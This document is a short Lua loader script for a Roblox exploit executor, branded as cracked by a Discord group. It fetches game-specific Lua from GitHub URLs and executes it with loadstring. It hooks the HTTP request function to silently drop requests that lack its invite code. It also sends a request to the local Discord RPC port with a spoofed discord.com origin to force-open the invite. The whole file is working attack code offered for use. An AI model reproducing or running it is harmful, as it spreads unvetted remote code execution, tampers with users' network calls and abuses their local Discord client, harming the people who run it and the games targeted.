_G.NowLoaded, _G.JUMP, _G.SPAWNFUNC1, _G.Complete = true, true, true, true
_G.DiscordInvite, _G.ScriptsVersion = "d6SaFCJuTn", "Cracked by BADWAWE: discord.gg/d6SaFCJuTn"
_G.Scripts = {[2324662457] = "https://raw.githubusercontent.com/diepedyt/bui/main/2.lua",[4986566693] = "https://raw.githubusercontent.com/diepedyt/bui/main/4.lua",}
local a,b,c,d,e,f,g=assert,loadstring,_G.Scripts[game.gameId],(syn and syn.request) or (http and http.request) or http_request,game.HttpGet,game:GetService("HttpService"),string.match
local bad; bad = hookfunc(d, function(l) if l.Body ~= nil then if not g(l.Body, _G.DiscordInvite) then return end end return bad(l) end)
a(b and d and e, "dummie exploit, not support"); b(e(c,true))() d({Url='http://127.0.0.1:6463/rpc?v=1',Method='POST',Headers={['Content-Type']='application/json',Origin='https://discord.com'},Body=f:JSONEncode({cmd = 'INVITE_BROWSER',nonce = f:GenerateGUID(false),args = {code = _G.DiscordInvite}})})